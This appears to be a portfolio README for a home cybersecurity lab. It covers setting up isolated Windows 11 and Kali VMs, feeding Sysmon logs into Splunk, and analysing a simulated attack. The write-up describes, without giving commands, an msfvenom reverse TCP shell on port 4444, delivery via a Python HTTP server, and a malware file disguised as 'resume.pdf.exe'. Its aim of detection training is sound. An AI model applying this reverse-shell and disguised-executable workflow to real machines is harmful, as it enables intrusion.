## Cybersecurity Home Lab Setup and Threat Telemetry Analysis

### Objective

The objective of this project was to architect and deploy a robust, virtualized home lab environment to serve as a secure, segmented sandbox for advanced cybersecurity practice. The core goal was to install and configure a **Type-2 hypervisor** to host a current target machine (**Windows 11 Pro**) and an attacker machine (**Kali Linux**), while specifically focusing on **Detection Engineering** by:

* **Isolating the lab network** completely using internal virtual networking to prevent host machine compromise.
* Deploying an advanced logging agent (**Sysmon**) and a **Security Information and Event Management (SIEM)** platform (**Splunk**) to collect high-fidelity security telemetry.
* Simulating basic attacker Tactics, Techniques, and Procedures (**TTPs**) to generate relevant log data and practice **analyzing the full attack chain** within the SIEM environment.

---

### Skills Learned

**I. Infrastructure & Systems Administration:**
* **Virtualization Management:** Deployed and configured **Oracle VirtualBox** to host multiple guest operating systems, effectively managing hypervisor settings and resource allocation.
* **OS Provisioning & Customization:** Performed manual installation of the **Windows 11 Pro ISO** and imported pre-configured virtual appliances (**Kali Linux**).
* **Low-Level System Configuration:** Successfully bypassed mandatory Windows 11 hardware requirements (**TPM, Secure Boot**) within the VM environment by executing commands and/or making **Registry modifications** during the setup process.
* **File Integrity Verification:** Utilized cryptographic hashing (**SHA-256**) via **Windows PowerShell** (`Get-FileHash`) to verify the integrity and authenticity of software installers before execution.
* **Snapshot & Disaster Recovery:** Implemented **snapshot strategies** to create "known good" baselines, allowing for rapid system restoration after destructive testing or malware execution.

**II. Network Architecture & Isolation (Sandboxing):**
* **Network Segmentation:** Configured VM network adapters to use **Internal Network** mode (VirtualBox) or **LAN Segment** (VMware), ensuring complete network isolation from the host and production network.
* **Static IP Configuration:** Performed manual **static IPv4 address assignment** on both Windows and Kali Linux guests, providing reliable, controlled communication exclusively between the lab machines.

**III. Detection Engineering (Blue Team):**
* **Endpoint Logging:** Installed and configured **Sysmon** on the Windows target machine to generate rich security telemetry (Process Creation, Network Connections, etc.).
* **SIEM Administration:** Deployed and configured **Splunk Enterprise** to ingest Sysmon event logs by setting up appropriate indices and using the **Splunk Add-on for Sysmon**.
* **Threat Analysis & Querying:** Performed log analysis via **Splunk Search Processing Language (SPL)** to trace the simulated attack chain, identifying malware process execution, outbound connections, and post-exploitation commands.

**IV. Threat Simulation (Red Team):**
* **Reconnaissance:** Employed **nmap** for basic network service identification and port scanning against the target system.
* **Exploitation Tooling:** Utilized **msfvenom** to generate a reverse TCP shell payload and **Metasploit Framework (msfconsole)** to set up a listening handler to catch the shell.
* **Delivery Simulation:** Used a **Python HTTP server** to simulate a basic delivery mechanism for the malware payload.

---

### Tools Used

**Virtualization Stack:**
* **Oracle VirtualBox 7.0** (Type-2 Hypervisor)
* **Windows 11 Pro** (Target OS)
* **Kali Linux** (Attacker OS)

**SIEM & Logging:**
* **Splunk Enterprise** (SIEM Platform)
* **Sysmon** (Windows Endpoint Logger)
* **Splunk Add-on for Sysmon** (Log Parsing)

**Offensive Tools:**
* **nmap** (Network Scanner)
* **msfvenom** (Payload Generation)
* **Metasploit Framework (msfconsole)** (Handler/Listener)

**Core Utilities:**
* **Windows PowerShell** (`Get-FileHash`, `ipconfig`)
* **Windows Registry Editor (regedit)**
* **7-Zip** (File Archiving)
* **Python 3** (`http.server` module)

---

### Network Architecture Diagram
<img width="975" height="413" alt="image" src="https://github.com/user-attachments/assets/f02ac034-e5a0-4291-92e1-eb2544aa6c44" />

---

### Key Results
**Suspicious Network Activity**
![Malware Network Telemetry](docs/screenshots/splunk-network-telemetry.png)
- IP address `192.168.20.11` attempts to reach port **4444**, which is commonly used for Metasploit reverse shells or C2 channels.  
- Actions to take:  
  1. Verify the source system.  
  2. Scan the system for malware.  
  3. Block port 4444 if not intended.  
  4. Monitor network logs for further suspicious activity.  

**Suspicious Parent/Child Process Execution**
![Malware Process Execution](docs/screenshots/splunk-process-telemetry.png)
- The parent process `resume.pdf.exe` is suspicious — PDFs are never `.exe` files.  
- Located in the Downloads folder, typical for malware payloads.  
- The child process `WerFault.exe` is legitimate, but here it is spawned unusually by the malicious executable.  
- Command line arguments (`WerFault.exe -u -p 1052 -s 432`) are normal for Windows Error Reporting, but the context indicates malware activity.  
- **Conclusion:** `resume.pdf.exe` is malware attempting to execute and blend in with normal system processes.

---

### Full Walkthrough

For the complete step-by-step guide (including all screenshots), see:
[Full Walkthrough Documentation](docs/full-walkthrough.md)

---

### Future Improvements
To expand the scope of this lab and transition it into a more realistic representation of an enterprise monitoring environment, the following improvements are planned:

#### I. Advanced Detection and Automation 🤖

* **Custom Correlation Rules:** Develop specific, high-fidelity alerts within Splunk that trigger when a sequence of suspicious events occurs (e.g., a process execution followed immediately by a network connection to an unknown external IP).
    * *Goal:* Reduce alert fatigue by creating rules based on confirmed **Tactics, Techniques, and Procedures (TTPs)** rather than single events.
* **Dashboard Development:** Build a dedicated **Threat Triage Dashboard** in Splunk to visualize key Sysmon data (Process, Network, File activity) and facilitate rapid, efficient incident review.
* **MITRE ATT&CK Mapping:** Map all simulated attacker actions (e.g., Execution, Command and Control) to the appropriate **MITRE ATT&CK Framework** techniques to build a structured defense plan.

#### II. Network and External Telemetry 🌐

* **Introduce Network Security Monitoring (NSM):** Integrate a dedicated open-source NSM tool like **Security Onion** or **Suricata/Zeek** on a separate VM.
* **Layered Logging:** Begin ingesting network flow logs and Intrusion Detection System (IDS) alerts alongside the host-based Sysmon data. This will allow for true **defense-in-depth** analysis by cross-validating endpoint telemetry with network traffic.

#### III. Expanded Threat Simulation & Complexity 📈

* **Simulate Persistence:** Conduct new simulations targeting persistence mechanisms, such as modifying the Windows Registry (**Run Keys**) or creating scheduled tasks. Analyze the resulting **Sysmon Registry EventCodes (12, 13, 14)** to build targeted registry monitoring rules.
* **Credential Theft Simulation:** Utilize tools like Mimikatz (safely within the isolated lab) to simulate credential dumping and focus on detecting the suspicious process access events that precede successful theft.

---

### Conclusion

This project successfully achieved its core objective: deploying a fully isolated, instrumented home lab capable of high-fidelity threat detection and analysis. The work confirmed proficiency across several critical domains relevant to a Security Operations Center (SOC) role:

* **Detection Engineering Proficiency:** Successfully deployed and integrated industry-standard host logging (**Sysmon**) with a leading **SIEM** platform (**Splunk**), demonstrating the ability to establish and maintain an effective security monitoring infrastructure.
* **Log Triage & Incident Analysis:** Used **Splunk Search Processing Language (SPL)** to efficiently triage logs, specifically isolating and analyzing the attack chain's most critical event (**Process Creation, EventCode 1**).
* **Critical Thinking & Anomaly Detection:** The analysis went beyond simple alert confirmation. It identified the **anomalous behavior** of the malicious `resume.pdf.exe` spawning the legitimate **`WerFault.exe`** (Windows Error Reporting). This demonstrated the ability to detect subtle **Indicators of Compromise (IOCs)** and understand common attacker techniques (e.g., using a crash to obscure execution), a core competency for SOC Analysts.
* **Systems and Network Hardening:** Established a secure, segmented lab environment (192.168.20.0/24), showcasing practical systems administration and network isolation skills crucial for safe, repeatable threat testing.

***

## Conclusion

This project successfully achieved its core objective: deploying a fully isolated, instrumented home lab capable of high-fidelity threat detection and analysis. The work confirmed proficiency across several critical domains relevant to a Security Operations Center (SOC) role:

* **Detection Engineering Proficiency:** Successfully deployed and integrated industry-standard host logging (**Sysmon**) with a leading **SIEM** platform (**Splunk**), demonstrating the ability to establish and maintain an effective security monitoring infrastructure.
* **Log Triage & Incident Analysis:** Used **Splunk Search Processing Language (SPL)** to efficiently triage logs, specifically isolating and analyzing the attack chain's most critical event (**Process Creation, EventCode 1**).
* **Critical Thinking & Anomaly Detection:** The analysis went beyond simple alert confirmation. It identified the **anomalous behavior** of the malicious `resume.pdf.exe` spawning the legitimate **`WerFault.exe`** (Windows Error Reporting). This demonstrated the ability to detect subtle **Indicators of Compromise (IOCs)** and understand common attacker techniques (e.g., using a crash to obscure execution), a core competency for SOC Analysts.
* **Systems and Network Hardening:** Established a secure, segmented lab environment (192.168.20.0/24), showcasing practical systems administration and network isolation skills crucial for safe, repeatable threat testing.

***

## Future Improvements

To expand the scope of this lab and transition it into a more realistic representation of an enterprise monitoring environment, the following improvements are planned:

#### I. Advanced Detection and Automation 🤖

* **Custom Correlation Rules:** Develop specific, high-fidelity alerts within Splunk that trigger when a sequence of suspicious events occurs (e.g., a process execution followed immediately by a network connection to an unknown external IP).
    * *Goal:* Reduce alert fatigue by creating rules based on confirmed **Tactics, Techniques, and Procedures (TTPs)** rather than single events.
* **Dashboard Development:** Build a dedicated **Threat Triage Dashboard** in Splunk to visualize key Sysmon data (Process, Network, File activity) and facilitate rapid, efficient incident review.
* **MITRE ATT&CK Mapping:** Map all simulated attacker actions (e.g., Execution, Command and Control) to the appropriate **MITRE ATT&CK Framework** techniques to build a structured defense plan.

#### II. Network and External Telemetry 🌐

* **Introduce Network Security Monitoring (NSM):** Integrate a dedicated open-source NSM tool like **Security Onion** or **Suricata/Zeek** on a separate VM.
* **Layered Logging:** Begin ingesting network flow logs and Intrusion Detection System (IDS) alerts alongside the host-based Sysmon data. This will allow for true **defense-in-depth** analysis by cross-validating endpoint telemetry with network traffic.

#### III. Expanded Threat Simulation & Complexity 📈

* **Simulate Persistence:** Conduct new simulations targeting persistence mechanisms, such as modifying the Windows Registry (**Run Keys**) or creating scheduled tasks. Analyze the resulting **Sysmon Registry EventCodes (12, 13, 14)** to build targeted registry monitoring rules.
* **Credential Theft Simulation:** Utilize tools like Mimikatz (safely within the isolated lab) to simulate credential dumping and focus on detecting the suspicious process access events that precede successful theft.

#### Directory 

1. [Installing VirtualBox](#installing-virtualbox)
2. [Installing Windows ISO Image](#installing-windows-iso-image)
3. [Installing 7-Zip](#installing-7-zip)
4. [Installing Kali Linux VM](#installing-kali-linux-vm)
5. [Importing Windows 11 ISO to VirtualBox](#importing-windows-11-iso-to-virtualbox)
6. [Running Windows Without a Microsoft Account](#running-windows-without-a-microsoft-account)
7. [Import Kali Linux to VirtualBox](#import-kali-linux-to-virtualbox)
8. [Creating Snapshots to revert to baseline config](#creating-snapshots-to-revert-to-baseline-config)
9. [Configuring VMs Based On Use Case Scenario](#configuring-vms-based-on-use-case-scenario)
10. [Scenario 1: Testing Tools That Require Internet Connectivity](#scenario-1-testing-tools-that-require-internet-connectivity)
11. [Scenario 2: Analyzing Malware Recommended Settings](#scenario-2-analyzing-malware-recommended-settings)
12. [Network Configuration For Both VMs](#network-configuration-for-both-vms)
13. [Installing Splunk On Windows 11 Pro VM](#installing-splunk-on-windows-11-pro-vm)
14. [Configuring Splunk To Ingest Sysmon Logs](#configuring-splunk-to-ingest-sysmon-logs)
15. [Creating and Using Malware To Test and Analyze Splunk and Sysmon Telemetry](#creating-and-using-malware-to-test-and-analyze-splunk-and-sysmon-telemetry)

#### Installing VirtualBox
Step 1: Head to https://www.virtualbox.org/wiki/Downloads and click download. 
<img width="975" height="731" alt="image" src="https://github.com/user-attachments/assets/30ad990f-474a-4f8a-911a-c4c6dcccae9b" />
Step 1.2: Choose the operating system you are using… in my case Windows. 
<img width="975" height="675" alt="image" src="https://github.com/user-attachments/assets/29b9f614-47a0-4d66-87fa-3f8cc50b1d6d" />
Step 2.1: Compare Hash values to verify integrity of installer. 
<img width="975" height="906" alt="image" src="https://github.com/user-attachments/assets/0dc3caff-3d42-4949-b1be-21040c2b9d4d" />
Step 2.2: Find the VirtualBox version of what you downloaded inside the checksum list. In my case “VirtualBox-7.2.4-170995-Win.exe”  
<img width="975" height="423" alt="image" src="https://github.com/user-attachments/assets/7778b3fd-9d16-41e5-94cf-718ea70ea7c3" />
Step 2.3: Go to where you downloaded the file > Right Click > Then click “Open in Terminal”  
<img width="975" height="467" alt="image" src="https://github.com/user-attachments/assets/c5546b68-4e84-4dda-a20a-0994121d368f" />

Step2.4: This will open up powershell and in powershell type command.
```PowerShell
Get-FileHash .\VirtualBox-7.2.4-170995-Win.exe
```
Then press enter.
Note: “VirtualBox-7.2.4-170995-Win.exe” is my file name yours might be different
<img width="975" height="542" alt="image" src="https://github.com/user-attachments/assets/4301930f-691c-4e6b-a3e2-8b96c00bfdf9" />
Step 2.5: Double click the generated hash to copy it  
<img width="975" height="548" alt="image" src="https://github.com/user-attachments/assets/9429e57f-56ac-45e3-af4d-0a0e7e07520c" />
Step 2.6: Return to virtualbox checksum list > do ctrl+F > paste in the hash value in powershell from the last step  
<img width="975" height="938" alt="image" src="https://github.com/user-attachments/assets/905c2298-3ce4-41ad-81ec-7a778e6c4cf6" />
Step 2.7: If the same hash value shows the file is not tampered with thus verifying integrity.

Step 3: Initialize installation.
<img width="767" height="610" alt="image" src="https://github.com/user-attachments/assets/f0967515-9544-43e2-b3ff-ebc1529ba954" />
<img width="769" height="613" alt="image" src="https://github.com/user-attachments/assets/c065808c-3cd3-4a96-b56b-e2b2510c0040" />
<img width="760" height="617" alt="image" src="https://github.com/user-attachments/assets/d7024a5f-06f3-4edb-9d51-b431db0c4800" />
<img width="754" height="623" alt="image" src="https://github.com/user-attachments/assets/44e71615-cdd6-4a82-adca-907e88b25493" />
<img width="756" height="617" alt="image" src="https://github.com/user-attachments/assets/4163a520-fcd2-4578-b17a-6e0103c080f1" />
<img width="752" height="608" alt="image" src="https://github.com/user-attachments/assets/0eed9395-273f-411f-9414-bb96b74ead8e" />
<img width="763" height="623" alt="image" src="https://github.com/user-attachments/assets/3dc30d93-e60b-494e-b9d1-e113f12c450d" />
<img width="767" height="617" alt="image" src="https://github.com/user-attachments/assets/5a089bcf-9387-4acf-bbad-c9db8776268c" />

#### Installing Windows ISO Image
Step 1: Go to https://www.microsoft.com/en-us/software-download/windows11 > Create Windows 11 Installation Media > Download 
<img width="975" height="898" alt="image" src="https://github.com/user-attachments/assets/dddd49da-5f62-4c78-868a-f4366c5b4519" />
Step 2: Initialize Installer 
<img width="975" height="767" alt="image" src="https://github.com/user-attachments/assets/0c49929c-509a-4efc-98cd-e65cf9183e6c" />
<img width="975" height="788" alt="image" src="https://github.com/user-attachments/assets/5fdaa612-c0b0-41a4-b89e-deb25b913b94" />
<img width="975" height="785" alt="image" src="https://github.com/user-attachments/assets/187242aa-b592-4651-a91c-a1d7aaf34c86" />
<img width="975" height="785" alt="image" src="https://github.com/user-attachments/assets/499f610f-0800-47c1-9e7b-6a96217afbd4" />

#### Installing 7-Zip
Step 1: go to https://www.7-zip.org/ > Choose appropriate  bit type that corresponds to your system (eg. 64-bit vs 32-bit) .
<img width="860" height="642" alt="image" src="https://github.com/user-attachments/assets/7dbeb4f8-4227-4e60-a88e-51e42da40fd7" />
<img width="494" height="342" alt="image" src="https://github.com/user-attachments/assets/d7192cb8-6eff-4a8a-b724-3bf29f3b2227" />
Step 2: Initialize Installer 
<img width="494" height="371" alt="image" src="https://github.com/user-attachments/assets/063d9c23-662d-4371-875a-2a333cc8a7ea" />

#### Installing Kali Linux VM
Step 1: Go to https://www.kali.org/get-kali/#kali-virtual-machines > VirtualBox Download  
<img width="975" height="948" alt="image" src="https://github.com/user-attachments/assets/09ae20f8-edf6-45a2-89a6-280c4a3b1be7" />
Step 2: Once installed right click installed file, more options > 7zip, Extract File here        
<img width="975" height="683" alt="image" src="https://github.com/user-attachments/assets/fbec7677-6301-45cf-a49c-028d092c7bc3" />
<img width="975" height="685" alt="image" src="https://github.com/user-attachments/assets/09738814-85b0-41da-bf30-587be760a5a6" />
<img width="975" height="623" alt="image" src="https://github.com/user-attachments/assets/c210bdce-0ea1-454f-bece-c5d44bc47028" />
<img width="867" height="554" alt="image" src="https://github.com/user-attachments/assets/1097f040-48e4-4cd4-8dcf-428bd84e4447" />

#### Importing Windows 11 ISO to VirtualBox
Step 1: Run VirtualBox
Step 2: Click New  
<img width="975" height="767" alt="image" src="https://github.com/user-attachments/assets/37fef640-7a45-481a-a892-ca3bfdcbb8fc" />
Step 3: Name VM whatever you want, Pick a Folder location to Place it In, ISO Image = “Windows.ISO” that we created earlier  
<img width="975" height="496" alt="image" src="https://github.com/user-attachments/assets/413d3cc1-20eb-4817-9b05-1e01c7960040" />
Step 4: Allocate Necessary system resources, Base Memory = 4096mb, CPU = 1, Disk Size = 20Gb    
<img width="975" height="513" alt="image" src="https://github.com/user-attachments/assets/5dc8d3d2-dfe5-4da0-8ec5-988cfb652af5" />
<img width="975" height="523" alt="image" src="https://github.com/user-attachments/assets/51610c74-3798-4976-95c1-11394a4ee77c" />
Step 5: Power on Win 11 VM  
<img width="975" height="765" alt="image" src="https://github.com/user-attachments/assets/b7ef1b40-9fc6-4527-b554-d250ffd092b0" />
Step 6: Initialize Windows 11 Installer
<img width="975" height="790" alt="image" src="https://github.com/user-attachments/assets/2523d1a6-2121-49c9-8e37-d6c77e36f7df" />
<img width="975" height="817" alt="image" src="https://github.com/user-attachments/assets/3c132ee5-d39b-435f-ada4-2380debc2c75" />
<img width="975" height="823" alt="image" src="https://github.com/user-attachments/assets/d2bcfcbc-4a4d-4983-8c66-108004abf530" />
<img width="975" height="821" alt="image" src="https://github.com/user-attachments/assets/9edf9877-9612-467d-ba25-7ee1a7b11c7c" />
<img width="975" height="821" alt="image" src="https://github.com/user-attachments/assets/58ec67ae-d5bd-4cc5-bd1e-63880fee7d80" />
<img width="975" height="821" alt="image" src="https://github.com/user-attachments/assets/1188c752-61bc-49f2-81cd-c8b6c6194418" />
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/eef81466-6bec-4f9d-9f0f-c96776e8e452" />
Step 6.1: If you get this screen we have to bypass requirements safely via a VM
Step 6.2: press Shift + F10 > Type “regedit”  
<img width="975" height="817" alt="image" src="https://github.com/user-attachments/assets/214aaba4-bef1-4bab-84dd-471832547fe1" />
Step 6.3: Navigate to HKEY_LOCAL_MACHINE\SYSTEM\Setup 
<img width="975" height="815" alt="image" src="https://github.com/user-attachments/assets/3ce17dea-13c7-4d5d-8539-7dd760e80cd3" />
Step 6.4: Right Click “Setup” Folder > New  > Key > Name = “LabConfig”  
<img width="975" height="819" alt="image" src="https://github.com/user-attachments/assets/c6620e0b-f1e6-4e0f-ab68-7150f4d215c7" />
Step 6.5: On the right > Right click > new > Create 4 DWORD (32-bit) Value 
<img width="975" height="917" alt="image" src="https://github.com/user-attachments/assets/e685d482-bbbf-4d3d-be97-42f07e9a5506" />
Step 6.6: Name them BypassTPMCheck = 1, BypassRAMCheck = 1, BypassSecureBootCheck = 1, BypassCPUCheck = 1   
<img width="975" height="817" alt="image" src="https://github.com/user-attachments/assets/2338daab-0a54-4bf2-bf68-a36d86b9484d" />
<img width="975" height="960" alt="image" src="https://github.com/user-attachments/assets/5f8e5abc-592e-47e5-9721-24b2494428ec" />
<img width="975" height="827" alt="image" src="https://github.com/user-attachments/assets/7beb6b74-c201-4afc-9677-f826547d5cdf" />
<img width="975" height="819" alt="image" src="https://github.com/user-attachments/assets/ca00e09f-c783-4c34-b836-52fbe5373c69" />
<img width="975" height="819" alt="image" src="https://github.com/user-attachments/assets/974ef8f1-f814-47e5-be14-243b41f0d884" />
Step 6.7: Try installing Windows 11 Pro again    
<img width="975" height="779" alt="image" src="https://github.com/user-attachments/assets/917b1298-07dd-4909-8926-d4be40264708" />
<img width="975" height="746" alt="image" src="https://github.com/user-attachments/assets/1ad0b2f5-cb03-46d4-b493-de579747c24b" />
<img width="975" height="773" alt="image" src="https://github.com/user-attachments/assets/60dd8463-e50f-4c83-b5af-843c4ebaa921" />
<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/890efd47-6b7f-4cdd-9fe5-03da76271d35" />
#### Running Windows Without a Microsoft Account
Step 1 After you reach this screen unplug network connection 
<img width="975" height="867" alt="image" src="https://github.com/user-attachments/assets/fc844667-1c28-44bb-bba5-f221bf789722" />
Step 2 on bottom right > Right Click Network Icon > Network Settings 
<img width="975" height="848" alt="image" src="https://github.com/user-attachments/assets/44512fcb-dc48-4e1f-9253-70b00b55e1bb" />
Step 3: Attach to from “Nat” to “Not Attached”  
<img width="975" height="677" alt="image" src="https://github.com/user-attachments/assets/07ffa0c7-85e3-4d65-b158-fdf937301dbe" />
Step 4: Restart VM and go back to Setup page
<img width="975" height="817" alt="image" src="https://github.com/user-attachments/assets/56820fdd-a82e-4282-baa0-856c522051ea" />
<img width="975" height="817" alt="image" src="https://github.com/user-attachments/assets/da1fba70-fb4e-4d8d-a7a5-734fc99ee755" />
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/ff053dad-3843-49aa-87de-73077f2d1135" />
<img width="975" height="819" alt="image" src="https://github.com/user-attachments/assets/333da4ea-ec6f-43a4-b79b-9db2d3fd15a5" />
<img width="975" height="821" alt="image" src="https://github.com/user-attachments/assets/5c291928-e49f-4bec-972f-9379950b7e84" />
<img width="965" height="808" alt="image" src="https://github.com/user-attachments/assets/b15f1d46-ddbd-4ee9-8601-aeeba65630d7" />
<img width="975" height="831" alt="image" src="https://github.com/user-attachments/assets/02194205-f806-4e4e-b95f-a7167a54f460" />
<img width="975" height="823" alt="image" src="https://github.com/user-attachments/assets/6bb1ce3b-1903-4b0b-9d8a-286eac43c8e4" />
<img width="975" height="827" alt="image" src="https://github.com/user-attachments/assets/00a75fc3-1458-4e90-8301-31727946d6dc" />
<img width="975" height="808" alt="image" src="https://github.com/user-attachments/assets/087a72f0-5bbd-4a6f-be88-288ff52ef919" />
<img width="975" height="817" alt="image" src="https://github.com/user-attachments/assets/6f9a13ef-8cc9-4b6b-b59c-2401504000b7" />

#### Import Kali Linux to VirtualBox
Step 1: Navigate to the folder where you extracted the Kali Linux zip 
<img width="975" height="392" alt="image" src="https://github.com/user-attachments/assets/6f02f73b-2d98-408d-ade2-432e32384fef" />

Step 2: Double  click on the folder  Double click the “.vbox” extension 
<img width="975" height="548" alt="image" src="https://github.com/user-attachments/assets/50cd27d7-4210-4f32-a5b1-8fee9cd7ee8a" />

Step 3: VirtualBox opens up automatically and puts in Kali Linux for you 
<img width="975" height="827" alt="image" src="https://github.com/user-attachments/assets/db5fee4d-0a34-4f0e-ab71-5550b220b49b" />

Step 4 : Power on Kali Linux VM Step 5: User = kali pw = kali  
<img width="975" height="863" alt="image" src="https://github.com/user-attachments/assets/529034d9-bc26-4ba6-a1dc-3b0fcd55ca80" />
Step 5: User = kali pw = kali
<img width="975" height="790" alt="image" src="https://github.com/user-attachments/assets/efd93596-ef11-41d5-b34f-f71227749c1e" />
<img width="975" height="829" alt="image" src="https://github.com/user-attachments/assets/6a7fb6ae-9dfc-4384-85a2-00f78c949b81" />

#### Creating Snapshots to revert to baseline config
Step 1: Click on intended VM > Snapshots > on top right, click take  
<img width="975" height="769" alt="image" src="https://github.com/user-attachments/assets/fb303237-18a0-4b45-a5a0-8d46b77c18c7" />

Step 2: Name the snapshot to your preference    
<img width="742" height="579" alt="image" src="https://github.com/user-attachments/assets/ab3b562e-57ad-4a95-b46f-339cbe683dee" />
<img width="975" height="765" alt="image" src="https://github.com/user-attachments/assets/cf1347ff-35d4-4492-9e8b-9f11bf9e28a4" />

#### Configuring VMs Based On Use Case Scenario
Step 1: Before we start configuring our VMs we must know what each network settings on VirtualBox do so we know which one to use based on any lab scenario you might test.  
 
NAT: Default mode; VM accesses the internet through the host (safe, isolated).
<img width="975" height="704" alt="image" src="https://github.com/user-attachments/assets/d656bf36-a140-43a3-a253-c4cb8289749b" />

Bridged Adapter: VM appears as a device on the same network as the host.  
<img width="975" height="679" alt="image" src="https://github.com/user-attachments/assets/219c2e35-5fad-4692-b942-e01a8f0b0cd3" />

Internal Network: VMs can communicate only with each other (no host or internet access).  
<img width="975" height="733" alt="image" src="https://github.com/user-attachments/assets/e5990364-2895-4cfd-8cbc-beb0760f2462" />

Host-only Adapter: VM communicates only with the host machine and other host-only VMs.  
<img width="975" height="723" alt="image" src="https://github.com/user-attachments/assets/f2c583a7-0a83-4eeb-91cc-5eea32681c6c" />

Generic Driver: Advanced/custom networking via external drivers.

NAT Network: Similar to NAT but allows multiple VMs on the same internal NATed subnet.  
<img width="975" height="735" alt="image" src="https://github.com/user-attachments/assets/a3a5b17e-cf06-4767-a326-7e17bc66ac71" />

Cloud Network (Experimental): Connects VM to cloud-based virtual networks (testing feature).
Not Attached: No network connection; VM sees no network hardware.  
<img width="975" height="752" alt="image" src="https://github.com/user-attachments/assets/5800bf95-03b2-4c7d-9a25-6e0634ff2ee7" />

#### Scenario 1: Testing Tools That Require Internet Connectivity
Step 1: This is simple. Use NAT and default settings for you Win11 Pro and Kali Linux VM in VirtualBox.    
<img width="975" height="765" alt="image" src="https://github.com/user-attachments/assets/ebded70a-6a7c-44c5-a365-131e71ba8ccd" />
<img width="975" height="642" alt="image" src="https://github.com/user-attachments/assets/233c0990-cd5c-405f-8f98-1ad5cddb9fd5" />
<img width="975" height="652" alt="image" src="https://github.com/user-attachments/assets/4ae0faa7-1525-416d-ab34-b330af96d008" />
Step 2: Repeat the same step into Kali Linux VM to “NAT”. It should be NAT already by default.

#### Scenario 2: Analyzing Malware Recommended Settings
Step 1: I recommend using the “Not attached” or “Internal Network” if the malware we are testing requires internet connectivity. Again, not attached means there is no internet connectivity and Internal Network means only VMs can communicate with each other not the host. Please refer to each diagram in “Configure VMs based on use case” section for a visual aid.   
<img width="975" height="767" alt="image" src="https://github.com/user-attachments/assets/d3de1be4-ae14-4d0a-b9ce-5fa99baa8795" />
<img width="975" height="646" alt="image" src="https://github.com/user-attachments/assets/c2bc3261-b52f-4434-ae7c-e82a65a579b7" />
<img width="975" height="658" alt="image" src="https://github.com/user-attachments/assets/8a9b342f-95bd-409a-84bc-5c0fb1d7039b" />

Step 2: Change Network name to “Test” or any name you prefer then hit ok.
<img width="975" height="660" alt="image" src="https://github.com/user-attachments/assets/67a9258e-7552-4983-90dd-8e73b1b68f48" />

  Step 3: Repeat the same step and change the Kali Linux VM to Internal Network and using the “Test” network we created in the previous steps.  
<img width="975" height="656" alt="image" src="https://github.com/user-attachments/assets/ffb2b514-b28d-429f-bfe5-51952a3e8433" />

#### Network Configuration For Both VMs 
Step 1: Assign static IP addresses for Win11 Pro VM. Power on VM.  
<img width="975" height="804" alt="image" src="https://github.com/user-attachments/assets/9617a8fb-e13f-44fe-a561-622937d9a0de" />

Step 1.1: Hover on the globe icon at the bottom right and right click. Then click on “Network and Internet Settings”  
<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/6bd070dd-995d-41ff-b893-45646b0931e3" />

Step 1.2: Click on “Ethernet”  
<img width="975" height="777" alt="image" src="https://github.com/user-attachments/assets/a2f73000-3402-43be-a453-481ba21e0d0b" />

Step 1.3: click IP assignment, “Edit”  
<img width="975" height="900" alt="image" src="https://github.com/user-attachments/assets/394352ff-3b94-44dd-98b4-18bdd69146e6" />

Step 1.4: Switch from “DHCP” to “Manual”  
<img width="975" height="821" alt="image" src="https://github.com/user-attachments/assets/dd6fe979-ff70-4ae2-8d14-58f0c45f5dcf" />

Step 1.5: Turn on “IPv4” and input IP address = 192.168.20.10, Subnet Mask = /24 or 255.255.255.0 then click save. We will leave gateway and dns blank for now since it’s a simple lab environment.  
<img width="975" height="946" alt="image" src="https://github.com/user-attachments/assets/51e69854-06f9-4daf-8f8e-552b851be400" />

Step 1.6: Lets verify our configuartion changes by going to command prompt and typing command “ipconfig”  
<img width="975" height="821" alt="image" src="https://github.com/user-attachments/assets/39f42c4e-c1b2-449e-9974-023997ca42a9" />
<img width="975" height="817" alt="image" src="https://github.com/user-attachments/assets/16f60e62-3fb9-4f2a-8234-40a442273907" />


Step 1.7: We need to allow ICMP ping request so Kali Linux VM can ping Win 11 Pro VM. Search “Windows Defender Firewall with Advanced Security”.  
<img width="975" height="796" alt="image" src="https://github.com/user-attachments/assets/068fe29a-2c3b-4bc9-863d-00320637dd27" />

Step 1.8: Go to Inbound Rules > Scroll and find “2 of File and Print Sharing (Echo Request – ICMPv4-In), then ctrl click both to select both, then right click both then, “Enable Rule”  
<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/49c1a959-64a4-43c7-9569-8dac47807264" />

Step 1.9: There should be a green check mark on both.
 <img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/cf7fc8b9-a0ae-4965-9405-364612408da1" />

Step 2: Assign static IP addresses for Kali Linux VM. Power on VM. Again user = kali pw =kali  
<img width="975" height="842" alt="image" src="https://github.com/user-attachments/assets/8e981bcc-e3be-47ac-8702-1c8e02b97100" />

Step 2.1: Right click Network Icon on top right corner > Click Edit Connections  
<img width="975" height="838" alt="image" src="https://github.com/user-attachments/assets/58846b50-0c73-4efd-a4f0-6547e90e12bf" />

Step 2.2: Select “Wired Connection” then click Gear icon on bottom left corner  
<img width="975" height="833" alt="image" src="https://github.com/user-attachments/assets/3d8c554f-8c07-4c24-b761-025da52de299" />

Step 2.3: Go to “IPv4 Settings” Tab > Change Method from “DHCP” to “Manual”, click Add then type in “192.168.20.11, Netmask = /24 then click save.  
<img width="975" height="848" alt="image" src="https://github.com/user-attachments/assets/d82333cb-150d-4490-8110-88fabf49c4b3" />

Step 2.4: Verify network configuration by right clicking on desktop screen > Open Terminal  
<img width="975" height="823" alt="image" src="https://github.com/user-attachments/assets/fc5a165f-fb21-4b09-9914-9ae8ad1561ff" />

Step 2.5: Type in command “ifconfig” and verify “inet” is “192.168.20.11” and “netmask” is “255.255.255.0” that is /24.
<img width="975" height="840" alt="image" src="https://github.com/user-attachments/assets/e7b082e1-6dcb-4c63-8556-cbdf8c73d490" />

Step 3: Lets verify connectivity by pinging from both VMs.

Step 3.1: Ping 192.168.20.10(Win11 Pro VM) from 192.168.20.11(Kali VM). Go to terminal > type command “ping 192.168.20.10”. Success. 
<img width="975" height="835" alt="image" src="https://github.com/user-attachments/assets/acd6ff1b-3790-4df3-99f4-72fa10d443bb" />

Step 3.2: Ping 192.168.20.11(Kali VM) from 192.168.20.10(Win11 Pro VM). Go to Command Prompt > Type command “Ping 192.168.20.11”. Success.  
<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/d22b20c8-a13e-4dba-a5df-4e2b62818c95" />

